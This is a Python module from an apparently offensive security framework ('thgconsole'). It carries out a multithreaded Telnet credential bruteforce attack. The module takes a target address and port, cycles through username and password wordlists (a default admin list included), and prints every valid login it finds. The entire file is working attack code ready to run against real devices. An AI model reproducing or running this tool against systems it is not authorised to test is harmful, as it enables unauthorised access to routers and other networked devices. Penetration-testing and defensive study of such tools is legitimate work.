from thgconsole.core.ModulesBuild.Exploits.exploit import *
from thgconsole.core.ModulesBuild.Exploits.option import *
from thgconsole.core.CoreUtils.exceptions import *
from thgconsole.core.ModulesBuild.Exploits.shell import *
from thgconsole.core.CoreUtils.utils import *
from thgconsole.core.CoreUtils.option import *
from thgconsole.core.CoreUtils.printer import *
from thgconsole.core.NetworkProtocols.telnet.telnet_client import TelnetClient
from thgconsole.file_suport import wordlists


class Exploit(TelnetClient):
    __info__ = {
        "name": "Telnet Bruteforce",
        "description": "Module performs bruteforce attack against Telnet service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "darkcode357@gmail.com",  # thg module
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = THGOptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = THGOptPort(23, "Target Telnet port")

    threads = THGOptInteger(8, "Number of threads")

    usernames = THGOptWordlist("admin", "Username or file with usernames (file://)")
    passwords = THGOptWordlist(wordlists.admint, "Password or file with passwords (file://)")

    verbosity = THGOptBool(True, "Display authentication attempts")
    stop_on_success = THGOptBool(True, "Stop on first valid authentication attempt")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting bruteforce attack against Telnet service")

        data = LockedIterator(itertools.product(self.usernames, self.passwords))
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next()
                telnet_client = self.telnet_create()
                if telnet_client.login(username, password, retries=3):
                    if self.stop_on_success:
                        running.clear()

                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))
                    telnet_client.close()

            except StopIteration:
                break

    def check(self):
        telnet_client = self.telnet_create()
        if telnet_client.test_connect():
            print_status("Target exposes Telnet service", verbose=self.verbosity)
            return True

        print_status("Target does not expose Telnet service", verbose=self.verbosity)
        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []

            data = LockedIterator(itertools.product(self.usernames, self.passwords))
            self.run_threads(self.threads, self.target_function, data)

            if self.credentials:
                return self.credentials

        return None
